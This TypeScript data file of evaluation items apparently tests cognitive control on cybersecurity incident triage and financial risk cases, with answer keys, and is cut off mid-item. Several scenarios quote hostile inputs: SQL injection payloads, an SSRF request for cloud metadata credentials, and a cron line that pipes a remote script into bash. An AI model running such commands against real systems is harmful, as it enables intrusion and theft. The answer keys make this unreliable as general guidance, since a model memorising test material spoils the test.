// CogControl-Stakes: Human Evaluation Task Data
// All items match exactly what the LLMs see

export const TASKS = {
  ef1: {
    id: "ef1",
    name: "EF-1: Diagnostic Decoy",
    description: "Read each cybersecurity/financial case and provide your assessment. Some cases have hidden contradictions — can you spot them?",
    paradigm: "Stroop Test (Inhibition)",
    responseType: "decoy",
    items: [
      {
        id: "cyber_incong_001",
        domain: "cybersecurity",
        trialType: "incongruent",
        difficulty: 4,
        title: "The Ransomware That Wasn't",
        case: `The SOC receives a Priority 1 alert at 02:17 UTC from the EDR platform on a file server (FS-PROD-04) in the corporate data center.

ALERT SUMMARY:
- Detection: "Ransomware behavior detected — rapid file enumeration and modification across multiple directories"
- Process: svchost.exe spawned cmd.exe which launched a PowerShell process
- Behavior observed: 2,847 files modified across 14 directories in 90 seconds
- File extensions changed: .docx → .docx.locked, .xlsx → .xlsx.locked, .pdf → .pdf.locked
- A file named "README_RESTORE.txt" was created in each affected directory
- Network: Outbound connection to 185.220.101[.]34 (Tor exit node) on port 443 detected 12 minutes before file activity began
- The PowerShell process executed an encoded command (Base64)
- Windows Event Log shows Event ID 4625 (failed logon) — 847 attempts against the Administrator account from internal IP 10.0.4.22 over the past 6 hours

BURIED DETAILS (from the full investigation log):

The EDR agent on FS-PROD-04 was updated 3 hours ago to version 7.4.2. The release notes for this version (posted on the vendor's community forum at 23:00 UTC) document a known bug: "False positive — the v7.4.2 sensor incorrectly classifies the Windows Search Indexer rebuild process as ransomware behavior when the indexer processes files in batch mode after a sensor update. The indexer's temporary file locking mechanism (.locked extension) and index summary files are misidentified. Hotfix 7.4.2.1 is in validation."

The decoded Base64 PowerShell command is: "Get-WindowsUpdate -Install -AcceptAll -AutoReboot" — this is the Windows Update module installing patches, which triggered the SearchIndexer rebuild.

The Tor exit node connection (185.220.101[.]34) resolves to the company's own external vulnerability scanner (Qualys appliance) whose egress IP rotates through Tor for anonymous external scanning, per the security team's documented architecture. This was a scheduled quarterly scan.

The 847 failed logon attempts from 10.0.4.22 correspond to the IT asset management tool (Lansweeper) performing its nightly credential-based inventory scan using an expired service account password, which the IT team submitted a ticket about 3 days ago (ITSM-4892, status: "pending password reset").`,
        question: "Based on this alert, what is your incident assessment and recommended immediate action?",
        surfacePattern: "Active ransomware attack",
        correctKeywords: ["false positive", "edr bug", "search indexer", "not ransomware", "qualys", "lansweeper", "do not isolate"],
        nContradictions: 5,
      },
      {
        id: "cyber_incong_002",
        domain: "cybersecurity",
        trialType: "incongruent",
        difficulty: 5,
        title: "The Clean Bill of Health",
        case: `A quarterly security review is conducted on the corporate web application gateway (WAG-01) serving the company's customer-facing SaaS platform. The system administrator reports "all clear — no incidents this quarter."

SURFACE-LEVEL REVIEW:
- WAF (Web Application Firewall) logs: 0 blocked attacks in the past 90 days
- IDS/IPS alerts: 0 high or critical alerts
- Antivirus: All scans clean, definitions current (updated daily)
- Vulnerability scan (Nessus): 0 critical, 2 medium (both patched within SLA), 8 low
- Uptime: 99.97% — only planned maintenance windows
- SSL/TLS: A+ rating on SSL Labs, TLS 1.3 only, HSTS enabled
- Access logs: Normal traffic patterns, no anomalous spikes
- Patch compliance: 100% — all CVEs patched within 72-hour SLA
- Last penetration test (6 weeks ago): "No critical or high findings"

BURIED IN THE DATA:

DNS query logs from the internal recursive resolver show that WAG-01 has been making DNS TXT record queries to a domain "update-check.systemctl[.]services" at precise 3-hour intervals (08:00, 11:00, 14:00, 17:00, 20:00, 23:00, 02:00, 05:00 UTC) for the past 67 days. The domain was registered 71 days ago through Namecheap with WHOIS privacy. The TXT records returned are Base32-encoded strings averaging 180 characters. The queries bypass the company's DNS filtering because they go to an internal resolver that forwards to 8.8.8.8 rather than the corporate DNS security gateway.

Netflow data shows WAG-01 sending small HTTPS POST requests (avg 2.3KB) to a Cloudflare Workers endpoint at worker-api.example-cdn[.]workers.dev every 3 hours, offset by 15 minutes from the DNS queries. The Cloudflare Workers domain was also registered 71 days ago. The certificate is valid (issued by Cloudflare), and the traffic is TLS 1.3 encrypted, making content inspection impossible.

The WAF and IDS show zero alerts because the command-and-control traffic uses legitimate DNS and HTTPS protocols to legitimate infrastructure (Google DNS, Cloudflare). No signatures fire because there are no malicious payloads in transit — only encoded commands inbound via DNS TXT and small encrypted exfiltration outbound via HTTPS.

A file integrity monitoring (FIM) exception was added 68 days ago for the directory /opt/wag/plugins/analytics/ by a systems administrator account. The exception note reads "excluding analytics plugin directory from FIM to reduce noise from frequent telemetry updates." The account that added the exception logged in via SSH from a VPN IP that does not match any employee's assigned VPN profile in the IAM system.`,
        question: "Based on this quarterly security review, what is your assessment of WAG-01's security posture and any recommended actions?",
        surfacePattern: "Clean security posture",
        correctKeywords: ["compromised", "c2", "command and control", "apt", "dns beacon", "exfiltration", "fim exception", "incident response"],
        nContradictions: 6,
      },
      {
        id: "cyber_incong_003",
        domain: "cybersecurity",
        trialType: "incongruent",
        difficulty: 3,
        title: "The Insider Threat Alert",
        case: `The Data Loss Prevention (DLP) system generates a high-severity alert for a senior software engineer, Maria Chen (Employee ID: E-4471), in the platform engineering team.

DLP ALERT DETAILS:
- Activity: 3.2 GB of source code files (.py, .go, .yaml, .tf) uploaded to a personal Google Drive account over the past 48 hours
- Pattern: Uploads occurred between 22:00-01:00 local time (outside business hours)
- Files include: core microservices source code, Terraform infrastructure configs, Kubernetes deployment manifests, and internal API documentation
- The personal Google Drive account (maria.chen.personal@gmail.com) is not an approved corporate storage destination
- Maria submitted her two-week resignation notice 5 days ago
- Her manager flagged in the HR system that Maria is "joining a direct competitor" (confirmed via LinkedIn update)
- Badge access logs show Maria entering the office at 21:45 on both nights (outside her normal 09:00-18:00 schedule)
- USB device connection detected on her workstation (SanDisk Ultra 128GB) during the same windows

ADDITIONAL CONTEXT (from IT and HR records):

Maria's resignation notice includes that her last day is in 9 days. Per company policy, her access to production systems was immediately reduced to read-only upon resignation submission.

IT records show that Maria filed a ticket (ITSM-7234) 6 days ago (one day before her resignation) requesting access to download her personal development environment configs, IDE settings, dotfiles, and personal side-project code that she had stored in her home directory on the corporate workstation. The ticket was approved by her manager with the note: "Approved — Maria has personal projects in ~/personal/ that predate her employment. She brought her own configs when she onboarded 4 years ago." HR confirmed this arrangement existed since her hire date.

A review of the actual files uploaded shows that 2.8 GB of the 3.2 GB transfer consists of files from ~/personal/ directory — containing her personal Kubernetes learning projects, contributed open-source code (all publicly available on her GitHub), her dotfiles/IDE configs, and blog post drafts. The remaining 0.4 GB was uploaded from ~/work/docs/ and contains the company's internal API documentation and two Terraform modules for the authentication service.

Maria's after-hours badge access corresponds to the only times the office's gigabit ethernet is available without bandwidth contention — she noted in the IT ticket that her home internet is "too slow for a 3 GB upload" and asked if she could use the office network. The USB drive was used to back up her personal files locally before the cloud upload (standard practice she confirmed in the ticket).`,
        question: "How should the security team respond to this DLP alert? What is your threat assessment and recommended action?",
        surfacePattern: "Active data exfiltration by departing employee",
        correctKeywords: ["partially legitimate", "approved ticket", "personal files", "0.4 gb", "work files", "proportionate", "not full insider threat"],
        nContradictions: 5,
      },
      {
        id: "cyber_incong_004",
        domain: "cybersecurity",
        trialType: "incongruent",
        difficulty: 4,
        title: "The Critical Zero-Day",
        case: `A vulnerability intelligence feed delivers an urgent advisory at 06:00 UTC Monday morning:

ADVISORY: CVE-2026-31337 — Critical Remote Code Execution in Apache HTTP Server
- CVSS Base Score: 9.8 (Critical)
- Attack Vector: Network / No Authentication Required / No User Interaction
- Affected Versions: Apache HTTP Server 2.4.58 through 2.4.62
- Description: "A heap-based buffer overflow in mod_rewrite allows unauthenticated remote attackers to execute arbitrary code by sending a specially crafted URL with nested regex backreferences exceeding the internal buffer. Exploitation is trivial and proof-of-concept code is publicly available."
- Vendor Status: "Patch available — upgrade to Apache 2.4.63"
- CISA KEV: Added to Known Exploited Vulnerabilities catalog
- Threat Intelligence: "Active exploitation observed in the wild by multiple threat actors targeting financial services and government sectors"

YOUR ENVIRONMENT:
- 47 internet-facing Apache HTTP Server instances across 3 data centers
- All running Apache 2.4.61 (within the affected range)
- These servers front the company's primary revenue-generating e-commerce platform
- Change Advisory Board (CAB) next meets Thursday — emergency changes require VP approval
- The last emergency patch (3 months ago) caused a 4-hour outage due to configuration incompatibility

BURIED DETAILS:

Upon deeper investigation, all 47 Apache instances have the following configuration:
- mod_rewrite is DISABLED in the httpd.conf (the servers use mod_proxy for reverse proxy routing, not URL rewriting)
- All 47 servers sit behind AWS Application Load Balancers (ALB) with AWS WAF rules that include the OWASP Core Rule Set, which blocks malformed URLs with nested regex patterns
- The Apache instances are containerized (running in ECS Fargate) with read-only root filesystems and no outbound internet access (egress restricted to internal VPC endpoints only)
- The Apache user runs as UID 65534 (nobody) with Linux capabilities dropped (no CAP_NET_RAW, no CAP_SYS_ADMIN) and seccomp profile enforced

The CVE advisory's "affected versions" list includes 2.4.58-2.4.62, but the National Vulnerability Database's detailed analysis notes: "This vulnerability is only exploitable when mod_rewrite is loaded AND RewriteRule directives with regex backreferences are actively processing requests. Installations not using mod_rewrite are NOT affected." This clarification was added to the NVD page 2 hours after the initial advisory.`,
        question: "What is your risk assessment for CVE-2026-31337 in your environment, and what patching timeline do you recommend?",
        surfacePattern: "Critical zero-day requiring emergency patching",
        correctKeywords: ["mod_rewrite disabled", "not exploitable", "not affected", "normal patch cycle", "do not emergency patch", "defense in depth", "waf"],
        nContradictions: 5,
      },
      {
        id: "cyber_cong_001",
        domain: "cybersecurity",
        trialType: "congruent",
        difficulty: 2,
        title: "Textbook SQL Injection",
        case: `The WAF generates alerts for the company's customer portal (portal.company.com).

ALERT DETAILS:
- Source IP: 198.51.100.23 (VPN exit node, no customer association)
- Target: /api/v2/users/profile?id= endpoint
- Pattern: Repeated requests with SQL injection payloads in the 'id' parameter:
  - ?id=1' OR '1'='1
  - ?id=1' UNION SELECT username,password FROM users--
  - ?id=1'; DROP TABLE sessions;--
  - ?id=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
- Volume: 342 requests over 15 minutes, incrementally refining payloads
- WAF blocked 338 requests (4 returned HTTP 200 before WAF rule update propagated)

APPLICATION INVESTIGATION:
- The /api/v2/users/profile endpoint uses raw SQL string concatenation (no parameterized queries)
- Code review reveals: query = f"SELECT * FROM users WHERE id = '{user_input}'"
- The 4 unblocked requests returned full user records including email addresses, hashed passwords, and session tokens
- Database logs confirm the UNION SELECT query successfully executed and returned data from the users table
- The database user has SELECT permissions on all tables (no principle of least privilege)
- No rate limiting is configured on the API endpoint
- The application has no input validation or sanitization on the 'id' parameter
- The database contains 184,000 customer records with PII (names, emails, hashed passwords, billing addresses)

NETWORK LOGS:
- The source IP has no prior history of legitimate access
- Geolocation: Eastern European VPN provider
- The IP was listed on AbuseIPDB with 97% confidence score for web application attacks 2 days ago`,
        question: "What is your assessment of this security event and what immediate actions should be taken?",
        surfacePattern: "Active SQL injection attack with confirmed data breach",
        correctKeywords: ["sql injection", "data breach", "block ip", "parameterized queries", "breach notification", "password reset", "pii"],
        nContradictions: 0,
      },
      {
        id: "cyber_cong_002",
        domain: "cybersecurity",
        trialType: "congruent",
        difficulty: 2,
        title: "Compromised Service Account",
        case: `AWS CloudTrail alerts fire for the production AWS account.

ALERT SUMMARY:
- Principal: arn:aws:iam::123456789012:user/svc-deploy-pipeline (service account for CI/CD)
- Activity detected at 03:42 UTC Sunday (no deployments scheduled):
  - iam:CreateUser — new user "backup-admin" created
  - iam:AttachUserPolicy — AdministratorAccess policy attached to "backup-admin"
  - iam:CreateAccessKey — access key generated for "backup-admin"
  - ec2:DescribeInstances — enumerated all EC2 instances across all regions
  - s3:ListBuckets — listed all S3 buckets (847 buckets returned)
  - s3:GetObject — downloaded 23 objects from s3://company-secrets-vault/prod/credentials/
  - s3:GetObject — downloaded 8 objects from s3://financial-reports-internal/2025/
  - kms:ListKeys — enumerated all KMS encryption keys
  - kms:Decrypt — 4 decrypt operations on keys associated with the secrets vault

INVESTIGATION:
- The svc-deploy-pipeline access key was last rotated 287 days ago (policy requires 90-day rotation)
- The access key was found hardcoded in a public GitHub repository (company fork of an open-source deployment tool) — committed 12 days ago by a junior developer
- GitHub's secret scanning sent a notification 12 days ago, but it was routed to a shared inbox that nobody monitors
- The source IP for all the above API calls (45.33.32.156) is a known bulletproof hosting provider
- The "backup-admin" user's access key was used within 4 minutes of creation to make API calls from a different IP (185.220.100.252, Tor exit node)
- No MFA is configured on the svc-deploy-pipeline account
- The service account has AdministratorAccess policy (overly permissive for a CI/CD pipeline)
- CloudTrail shows this is the first time the service account has ever called iam:CreateUser, kms:Decrypt, or accessed the secrets vault bucket`,
        question: "What is your incident assessment and what immediate containment actions should be taken?",
        surfacePattern: "Compromised AWS service account — active credential theft",
        correctKeywords: ["compromised", "credential", "disable access key", "delete backup-admin", "rotate secrets", "github leak", "breach"],
        nContradictions: 0,
      },
      {
        id: "fin_incong_001",
        domain: "finance",
        trialType: "incongruent",
        difficulty: 4,
        title: "Case 7",
        case: `TechVista Inc. (TVST) — Mid-cap SaaS company, market cap $4.2B.

HEADLINE METRICS: Revenue $285M (+18% YoY, accelerating from +12%), Gross margin 78% (from 72%), Net income $42M (first profitable quarter), FCF $38M positive, Customer count 12,400 (+22% YoY), NRR 128%.

MARKET SIGNALS: CEO purchased 50,000 shares ($2.1M) 45 days ago. Three analyst upgrades (Goldman, Morgan Stanley, JPM). Golden cross on 50/200-day MA. Short interest declined 8% to 3%.

10-Q FOOTNOTES (page 47/68): Related Party Transactions: "$78M of Q4 revenue (27% of total) came from CloudBridge Solutions, whose CEO is brother of TechVista's CFO. This is a 340% increase from prior year's $18M related-party revenue. Contract signed without competitive bidding."

Footnote 14: "Beginning Q3, the Company changed revenue recognition for multi-year contracts from ratable to 60% upfront. This contributed ~$34M to Q4 revenue. Under prior policy, growth would have been ~4% YoY rather than 18%."

Footnote 18: "The CEO's share purchase was made 3 days after the Board approved (but had not yet announced) the CloudBridge contract renewal."

MD&A (page 32): "Excluding CloudBridge, organic customer growth was 3% YoY (vs. 22% reported including CloudBridge's 15 enterprise sub-accounts counted as separate customers)."

Auditor's note: Company changed auditor from Deloitte to Baker & Associates LLP (regional firm) this quarter.`,
        question: "Based on your analysis, what is your investment recommendation and risk assessment?",
        surfacePattern: "strong buy",
        correctKeywords: ["avoid", "risk", "related party", "accounting", "fraud", "manufactured", "organic growth", "red flag", "insider"],
        nContradictions: 6,
      },
      {
        id: "fin_incong_002",
        domain: "finance",
        trialType: "incongruent",
        difficulty: 4,
        title: "Case 8",
        case: `Meridian Manufacturing Corp (MMC) — Large-cap industrial, market cap $28B.

VALUATION: P/E 8.2x (industry avg 18.5x), P/B 0.7x, Dividend yield 6.8%, EV/EBITDA 5.1x, FCF yield 11.2%. Trades at ~55% discount to DCF intrinsic value. Activist Starboard Value has 4.8% stake. $2B buyback announced. 15-year dividend growth streak.

10-K RISK FACTORS (page 89): "62% of revenue from PFAS-containing products. Named in 3,400 pending lawsuits seeking aggregate damages exceeding $18B."

Note 22: "Environmental remediation liability estimated $1.2B-$8.4B. Only minimum ($1.2B) accrued. Independent consultants suggest $4.8B most probable."

Note 15: "Pension underfunded by $3.2B. Assumed discount rate 5.8% is 120bp above corporate bond benchmark."

MD&A: "PFAS remediation capex $400M-$900M over 5 years, in addition to legal settlements."

Balance Sheet: Total debt $12.4B. Debt/EBITDA 4.1x. $3.8B maturity in 18 months.`,
        question: "Is Meridian Manufacturing an attractive value investment? Provide risk assessment.",
        surfacePattern: "deep value",
        correctKeywords: ["value trap", "avoid", "pfas", "liability", "lawsuit", "pension", "underfunded", "overvalued", "hidden"],
        nContradictions: 6,
      },
      {
        id: "fin_cong_001",
        domain: "finance",
        trialType: "congruent",
        difficulty: 2,
        title: "Case 9",
        case: `NovaPay Technologies (NPAY) — Mid-cap fintech, market cap $6.8B.

Revenue $520M (+32% YoY, consistent 6 quarters), Gross margin 68%, Operating margin 12% (from 5%), FCF $62M, TPV $89B (+41%), NRR 135%, 48,000 merchants (+28% organic).

No related-party transactions. Revenue diversified (no customer >2%). Same auditor (EY) 5 years. Management tenure avg 7 years. Minimal insider selling (<0.5%). R&D 22% of revenue. Debt/equity 0.3x. EU expansion contributing 15% new growth. P/E 45x forward, PEG 1.2x.`,
        question: "Evaluate NovaPay as a potential investment. Risk assessment?",
        surfacePattern: "quality growth",
        correctKeywords: ["growth", "quality", "strong", "clean", "reasonable valuation", "no red flag"],
        nContradictions: 0,
      },
    ],
  },

  mc1: {
    id: "mc1",
    name: "MC-1: Calibrated Confidence",
    description: "Classify each item and place a wager. Correct = +wager. Wrong = -2x wager. Bet high when sure, low when uncertain.",
    paradigm: "Wagering Paradigm (Metacognitive Monitoring)",
    responseType: "calibration",
    items: [
      // Cybersecurity vulnerability assessment items
      { id: "cyber_mc1_001", domain: "cybersecurity", subtype: "attack_identification", difficulty: 1, prompt: `A user reports receiving the following email:

From: security-team@g00gle-verify.com
Subject: Urgent: Your account will be suspended in 24 hours
Body: "Dear valued customer, we detected unusual activity on your account. Click here to verify your identity immediately or your account will be permanently suspended. [VERIFY NOW — links to http://g00gle-verify.com/login?redirect=google.com]"

The email headers show:
- SPF: FAIL (sender IP not authorized for g00gle-verify.com)
- DKIM: NONE (no DKIM signature)
- DMARC: FAIL
- Reply-To: totallylegit8847@protonmail.com

Classify this email: legitimate / phishing / spam / graymail`, question: "Classify this email: legitimate / phishing / spam / graymail", correctAnswer: "phishing" },
      { id: "cyber_mc1_002", domain: "cybersecurity", subtype: "vuln_severity", difficulty: 1, prompt: `A network scan discovers an internet-facing administrative panel for a Cisco router at a branch office. The panel is accessible via HTTP (not HTTPS) on port 80. Testing reveals the device accepts the default credentials: username "admin", password "admin".

The router handles all network traffic for a 50-person branch office including VPN tunnels to the corporate data center.

Rate the severity of this finding: not_vulnerable / informational / low / medium / high / critical`, question: "Rate the severity of this finding: not_vulnerable / informational / low / medium / high / critical", correctAnswer: "critical" },
      { id: "cyber_mc1_003", domain: "cybersecurity", subtype: "cve_assessment", difficulty: 2, prompt: `Your vulnerability scanner flags CVE-2021-44228 (Log4Shell) on an internal Java application server. The server runs a Spring Boot application with the following dependency in its pom.xml:

<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>

The application accepts user input via a web form and logs the input using Logger.info("User submitted: " + userInput).

The server has outbound internet access for API integrations.

Is this application vulnerable to Log4Shell, and if so, what is the severity: not_vulnerable / informational / low / medium / high / critical`, question: "Assess the Log4Shell vulnerability severity: not_vulnerable / informational / low / medium / high / critical", correctAnswer: "critical" },
      { id: "cyber_mc1_004", domain: "cybersecurity", subtype: "attack_identification", difficulty: 2, prompt: `A web application running on AWS EC2 has a feature that fetches and displays the content of user-provided URLs (a "link preview" feature). A penetration tester submits the following URL:

http://169.254.169.254/latest/meta-data/iam/security-credentials/

The application returns:
{
  "Code": "Success",
  "LastUpdated": "2026-03-17T10:15:30Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalr...",
  "Token": "IQoJb3Jp...",
  "Expiration": "2026-03-17T16:30:00Z"
}

Identify the vulnerability severity: not_vulnerable / informational / low / medium / high / critical`, question: "Identify the vulnerability severity (SSRF to cloud metadata): not_vulnerable / informational / low / medium / high / critical", correctAnswer: "critical" },
      { id: "cyber_mc1_005", domain: "cybersecurity", subtype: "vuln_severity", difficulty: 3, prompt: `A Java web application uses Apache Commons Collections 3.2.1 as a dependency. During a code review, the following pattern is found in a REST endpoint:

ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();
UserPreferences prefs = (UserPreferences) obj;

The endpoint is authenticated (requires a valid JWT token) but is accessible to all 12,000 registered users of the application. The server runs as a non-root user but has network access to the internal database cluster and message queue.

Rate the severity: not_vulnerable / informational / low / medium / high / critical. Consider both the vulnerability itself and the environmental context.`, question: "Rate the deserialization vulnerability severity: not_vulnerable / informational / low / medium / high / critical", correctAnswer: "critical" },
      { id: "cyber_mc1_006", domain: "cybersecurity", subtype: "vuln_severity", difficulty: 3, prompt: `During external reconnaissance, the following DNS record is found:

staging-api.company.com  CNAME  company-staging.herokuapp.com

Attempting to resolve company-staging.herokuapp.com returns NXDOMAIN (the Heroku app has been deleted). Visiting staging-api.company.com in a browser shows Heroku's "There's nothing here" default page.

The main production domain company.com has:
- A wildcard SSL certificate covering *.company.com
- CORS policy: Access-Control-Allow-Origin: *.company.com
- The production application's session cookies are set with Domain=.company.com

Rate the severity of this subdomain takeover vulnerability: not_vulnerable / informational / low / medium / high / critical`, question: "Rate the subdomain takeover severity: not_vulnerable / informational / low / medium / high / critical", correctAnswer: "high" },
      { id: "cyber_mc1_007", domain: "cybersecurity", subtype: "vuln_severity", difficulty: 4, prompt: `A security researcher reports a race condition in a SaaS application's OAuth 2.0 authorization code flow. The vulnerability works as follows:

1. User A initiates OAuth login and receives authorization code 'abc123'
2. The application's /callback endpoint exchanges the code for an access token
3. The application creates a session and stores the access token in a database row identified by the authorization code
4. In a narrow window (~50ms) between steps 2 and 3, if User B sends a request with the same authorization code, the application creates a duplicate session
5. Due to a race condition in the database upsert logic, User B's session gets linked to User A's access token

The researcher demonstrates this reliably using 20 concurrent requests, achieving success ~5% of the time. Exploitation requires the attacker to know or predict the victim's authorization code.

The authorization codes are 32-character hex strings (128 bits of entropy) with a 60-second expiry. The application uses PKCE (Proof Key for Code Exchange) but the race condition occurs after PKCE validation.

Rate the severity: not_vulnerable / informational / low / medium / high / critical`, question: "Rate the OAuth race condition severity: not_vulnerable / informational / low / medium / high / critical", correctAnswer: "low" },
      { id: "cyber_mc1_008", domain: "cybersecurity", subtype: "cve_assessment", difficulty: 4, prompt: `A cloud hosting provider notifies you that the Intel Xeon processors in your multi-tenant environment are affected by a new Spectre-variant side-channel vulnerability (CVE-2026-XXXX). The advisory states:

"A speculative execution side-channel vulnerability allows a malicious VM on the same physical host to potentially read memory from other VMs through branch predictor aliasing. Proof-of-concept demonstrates extraction of 1 byte per 30 seconds from an adjacent VM's memory space."

Your environment:
- 14 production VMs running on AWS EC2 (m6i.xlarge instances)
- All VMs run on shared multi-tenant hardware (not dedicated hosts)
- Applications handle PCI DSS cardholder data and HIPAA PHI
- AWS has stated they will deploy microcode patches within 72 hours
- The microcode patch will cause an estimated 3-8% performance degradation

What is the actual risk level for your workloads: not_vulnerable / informational / low / medium / high / critical`, question: "Assess the Spectre-variant risk level: not_vulnerable / informational / low / medium / high / critical", correctAnswer: "low" },
      { id: "cyber_mc1_009", domain: "cybersecurity", subtype: "vuln_severity", difficulty: 5, prompt: `A research paper describes an attack combining three techniques:

1. JavaScript-based Rowhammer (inducing DRAM bit flips from browser JavaScript using cache eviction patterns)
2. Targeting physical memory rows adjacent to Intel SGX enclave pages
3. Exploiting the SGX enclave's integrity check mechanism: when a bit flip corrupts an enclave page, SGX aborts the enclave. By systematically flipping bits and observing abort/no-abort, the attacker performs a side channel to determine whether the enclave page contained a 0 or 1 at the flipped position.

The paper demonstrates extraction of an RSA private key from an SGX enclave in 3.5 hours on a controlled lab setup (Intel Skylake CPU, single-rank DDR4-2133, TRR disabled in BIOS).

Your production servers use:
- Intel Ice Lake CPUs with updated microcode
- DDR4-3200 dual-rank ECC memory with Target Row Refresh (TRR) enabled
- SGX enclaves for processing payment card encryption keys
- The application server also runs a Node.js API that processes untrusted user-supplied JavaScript templates (using vm2 sandbox)

Rate the exploitability and severity in YOUR environment: not_vulnerable / informational / low / medium / high / critical`, question: "Rate the Rowhammer+SGX severity in your environment: not_vulnerable / informational / low / medium / high / critical", correctAnswer: "low" },
      { id: "cyber_mc1_010", domain: "cybersecurity", subtype: "attack_identification", difficulty: 5, prompt: `A security researcher reports the following attack chain against your SaaS platform:

1. The platform has a "website screenshot" feature that accepts user-provided URLs and renders them in a headless Chrome browser (Puppeteer) to generate a thumbnail
2. The researcher registers a domain with a DNS server they control, configured with a TTL of 0
3. First DNS resolution returns their own IP (attacker's server), which serves a page with JavaScript
4. The JavaScript waits 2 seconds, then uses XMLHttpRequest to request the same domain again
5. The second DNS resolution returns 10.96.0.1 (the Kubernetes API server's ClusterIP, discovered via a previous information leak)
6. Due to DNS rebinding, the headless Chrome treats this as same-origin and sends the request to the Kubernetes API
7. The Puppeteer container's service account token is mounted at /var/run/secrets/kubernetes.io/serviceaccount/token
8. The JavaScript reads the token from the filesystem via a file:// URL (Chrome allows this in headless mode with --allow-file-access-from-files flag)
9. The researcher demonstrates the service account has cluster-admin privileges

Which of the following correctly describes the PRIMARY root cause and the single most effective mitigation?

A. DNS rebinding — implement DNS pinning in the URL fetcher
B. Overprivileged service account — reduce to minimum required RBAC permissions
C. Headless Chrome misconfiguration — remove --allow-file-access-from-files flag
D. Network policy gap — implement NetworkPolicy to block pod-to-API-server traffic
E. Multiple compounding misconfigurations — no single fix is sufficient

Answer with: dns_rebinding / overprivileged_service_account / chrome_misconfiguration / network_policy_gap / multiple_misconfigurations`, question: "Identify the PRIMARY root cause: dns_rebinding / overprivileged_service_account / chrome_misconfiguration / network_policy_gap / multiple_misconfigurations", correctAnswer: "overprivileged_service_account" },
      // Risk factors (finance)
      { id: "rf_001", domain: "finance", subtype: "Risk Factor", difficulty: 1, prompt: "Silicon Valley Bank (SIVB) — Regional Banking — FY2022\n\nRisk: \"We are subject to interest rate risk. Rapid rate increases could cause significant unrealized losses on our $91.3B held-to-maturity portfolio. A large proportion of deposits are uninsured and from concentrated tech/VC sectors.\"", question: "Did this risk MATERIALIZE in the next 12 months? (materialized / did_not_materialize)", correctAnswer: "materialized" },
      { id: "rf_002", domain: "finance", subtype: "Risk Factor", difficulty: 2, prompt: "Pfizer (PFE) — Pharmaceuticals — FY2022\n\nRisk: \"Revenue from COVID-19 vaccine and antiviral may decline significantly as the pandemic transitions to endemic phase.\"", question: "Did this risk MATERIALIZE in the next 12 months? (materialized / did_not_materialize)", correctAnswer: "materialized" },
      { id: "rf_003", domain: "finance", subtype: "Risk Factor", difficulty: 3, prompt: "Tesla (TSLA) — Automotive — FY2022\n\nRisk: \"Increasing competition in EVs from traditional automakers and new entrants could adversely affect market share, pricing, and margins. We may need to reduce prices to maintain demand.\"", question: "Did this risk MATERIALIZE in the next 12 months? (materialized / did_not_materialize)", correctAnswer: "materialized" },
      { id: "rf_004", domain: "finance", subtype: "Risk Factor", difficulty: 4, prompt: "NVIDIA (NVDA) — Semiconductors — FY2022\n\nRisk: \"U.S. export controls restricting sales of advanced AI chips to China could materially impact revenue. China represented ~22% of data center revenue.\"", question: "Did this risk MATERIALIZE in the next 12 months? (materialized / did_not_materialize)", correctAnswer: "did_not_materialize" },
      { id: "rf_005", domain: "finance", subtype: "Risk Factor", difficulty: 5, prompt: "CrowdStrike (CRWD) — Cybersecurity — FY2023\n\nRisk: \"Our Falcon platform operates at the kernel level. Errors or defects in software updates could cause widespread system disruptions, resulting in significant reputational harm and legal liability.\"", question: "Did this risk MATERIALIZE in the next 12 months? (materialized / did_not_materialize)", correctAnswer: "materialized" },
    ],
  },

  mc2: {
    id: "mc2",
    name: "MC-2: Selective Abstention",
    description: "For each case, decide: ANSWER (risk +10 if right, -50 if wrong) or ABSTAIN (safe -2). Only answer when you're confident.",
    paradigm: "Opt-out Paradigm (Knowledge Boundary)",
    responseType: "abstention",
    items: [
      { id: "abs_cyber_001", domain: "cybersecurity", answerability: "answerable", difficulty: 1, case: `A security scanner flags an AWS S3 bucket named "company-public-assets" with the following configuration:

- Bucket Policy: Allows s3:GetObject for Principal: "*" (any AWS account, any unauthenticated user)
- ACL: Public-read enabled
- Block Public Access settings: All four settings are OFF
- Contents: 847 objects including:
  - /images/ directory: 780 PNG/JPG files (website logos, product images, marketing banners)
  - /css/ directory: 34 CSS files (website stylesheets)
  - /js/ directory: 18 JavaScript files (frontend libraries — jQuery, Bootstrap, etc.)
  - /backup/ directory: 15 files including database-export-2026-03-01.sql.gz (4.2 GB), .env.production, and aws-credentials.csv

The bucket is configured as the origin for a CloudFront CDN distribution serving the company's marketing website static assets.`, question: "What is the security risk level of this S3 bucket configuration, and what should be done?", answerKeywords: ["high risk", "backup", "credentials", "remove", "rotate", "exposed", "database", "env"] },
      { id: "abs_cyber_002", domain: "cybersecurity", answerability: "answerable", difficulty: 2, case: `During a routine server audit of a Linux web server (Ubuntu 22.04), the following cron job is discovered under the www-data user:

*/5 * * * * curl -s http://45.33.32.156:8443/update.sh | bash

Investigation reveals:
- The IP 45.33.32.156 is hosted on a bulletproof hosting provider known for malware distribution
- The cron job was created 23 days ago
- The www-data user's .bash_history shows it was added via: echo "*/5 * * * * curl -s http://45.33.32.156:8443/update.sh | bash" | crontab -
- The web server runs WordPress with 14 plugins, 3 of which have known unpatched vulnerabilities
- The update.sh script (when retrieved) contains commands to:
  - Download and install a cryptocurrency miner (xmrig)
  - Add an SSH public key to /root/.ssh/authorized_keys
  - Exfiltrate /etc/passwd and /etc/shadow to the remote server
  - Install a reverse shell that connects back every 10 minutes
- CPU utilization on the server has been at 94% for 23 days (previously averaged 15%)`, question: "What has happened to this server and what should be the response?", answerKeywords: ["compromised", "wordpress", "cryptominer", "isolate", "rebuild", "backdoor", "reverse shell", "credential"] },
      { id: "abs_fin_001", domain: "finance", answerability: "answerable", difficulty: 1, case: "30yo software engineer, $150K income, no debt. $50K emergency fund, $20K in 401(k) with 50% employer match up to 6%. Currently contributing 3%.", question: "What is the most impactful first step for investments?", answerKeywords: ["increase 401k", "6%", "employer match", "free money", "roth ira"] },
      { id: "abs_cyber_003", domain: "cybersecurity", answerability: "ambiguous", difficulty: 4, case: `Network monitoring detects an unusual traffic pattern from an internal development server (dev-ml-01, IP 10.0.8.55):

TRAFFIC PATTERN:
